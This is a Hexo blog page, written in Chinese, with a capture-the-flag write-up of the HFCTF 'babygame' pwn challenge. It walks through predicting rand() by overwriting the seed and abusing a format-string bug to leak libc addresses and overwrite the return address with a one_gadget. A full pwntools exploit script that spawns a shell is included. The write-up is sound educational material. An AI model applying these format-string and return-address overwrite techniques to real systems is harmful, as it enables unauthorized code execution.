@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="John Doe">
+
+
+
+
+
+<title>HFCTF babygame | hash_hash的博客</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">hash_hash&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/friend">Friends</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">hash_hash&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/friend">Friends</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">HFCTF babygame</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">John Doe</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">May 10, 2022&nbsp;&nbsp;21:51:54</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Pwn/">Pwn</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p><a target="_blank" rel="noopener" href="https://github.com/hash-hash/pwn/tree/main/pwn%E9%A2%98%E9%99%84%E4%BB%B6/HFCTF-babygame">附件</a></p>
+<p>调试了大半天感觉没啥问题但是libc基地址一直不对劲，最后在nameless师傅的指导下把虚拟机环境改成和靶机一样的环境就跑通了</p>
+<p>指路-&gt;<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-272653.htm">配置环境</a></p>
+<p>总的来说还是学到了很多，也算是认识到了gdb调试的重要性，多看看栈段存储的信息会有神奇的事情发生</p>
+<p>checksec一下保护全开</p>
+<img src="/2022/05/10/HFCTF-babygame/pic1.png" class>
+
+<p>主函数有个read读入的溢出，</p>
+<img src="/2022/05/10/HFCTF-babygame/pic2.png" class>
+
+<p>进入sub_1305发现是个猜数字的程序，如果成功猜对100次就能够进入sub_13F7</p>
+<img src="/2022/05/10/HFCTF-babygame/pic3.png" class>
+
+<p>有一个格式化字符串漏洞可以利用</p>
+<p>所以我们的想法首先就是覆盖随机数种子自己事先跑一波把数记录下来用来猜数字，注意得在linux下运行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> srand(<span class="number">0x61616161</span>);</span><br><span class="line"> <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="type">int</span> b=rand()%<span class="number">3</span>;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,b);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们在read处下个断点看看栈上有无值得利用的东西</p>
+<img src="/2022/05/10/HFCTF-babygame/pic4.png" class>
+
+<p>发现main函数栈段里有一些栈段的地址信息，其中最后一条发现可以随着泄露canary一并带出，但是实际上最后我没用上canary，也有不同的做法可以通过泄露程序基地址回到main，那么就需要用到canary构造rop链</p>
+<p>断点打在第二个read上查看栈段信息</p>
+<img src="/2022/05/10/HFCTF-babygame/pic5.png" class>
+
+<p>发现存有代码段(printf+175)和(atoi+20)的地址，利用其来获取libc基地址，为了让程序继续运行我们还得利用printf任意写更改ret地址，这里考虑到pie不会更改代码段的后三位，partial write一个字节使程序再次进入这个子函数，最后通过libc基址得到onegadget，重复上次操作再改一次ret即可getshell</p>
+<p>最后格式化字符串写一个地址信息需要四次二字节写入还要避免&#x2F;x00截断的情况，我直接偷懒使用format_str函数了，默认32位记得改架构为amd64</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./game&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;rand.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">rand=<span class="built_in">eval</span>(f.read())</span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x120</span>-<span class="number">0x10</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Please input your name:\n&#x27;</span>,payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x120</span>-<span class="number">0x10</span>))</span><br><span class="line">stack_base=u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ret=stack_base-<span class="number">0x218</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line"> p.recvuntil(<span class="string">&#x27;: \n&#x27;</span>)</span><br><span class="line"> temp=(rand[i]+<span class="number">1</span>)%<span class="number">3</span></span><br><span class="line"> p.sendline(<span class="built_in">str</span>(temp))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.sym[<span class="string">&#x27;atoi&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;%62c%8$hhn%27$pa&#x27;</span></span><br><span class="line">payload2+=p64(ret)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.recv(<span class="number">62</span>)</span><br><span class="line"></span><br><span class="line">atoi=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">20</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(atoi))</span><br><span class="line"></span><br><span class="line">libc_base=atoi-libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">onegadget=<span class="number">0xe3b31</span>+libc_base</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(onegadget))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">payload3 = fmtstr_payload(<span class="number">6</span>, &#123;ret:onegadget&#125;)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>John Doe</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://hash-hash.github.io/2022/05/10/HFCTF-babygame/">https://hash-hash.github.io/2022/05/10/HFCTF-babygame/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/fmt-str/"># fmt_str</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2022/05/09/Writeup-for-Crypto-Problem-in-2022%E6%98%A5%E7%A7%8B%E6%9D%AF/">Writeup for Crypto Problem in 2022春秋杯</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© John Doe | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
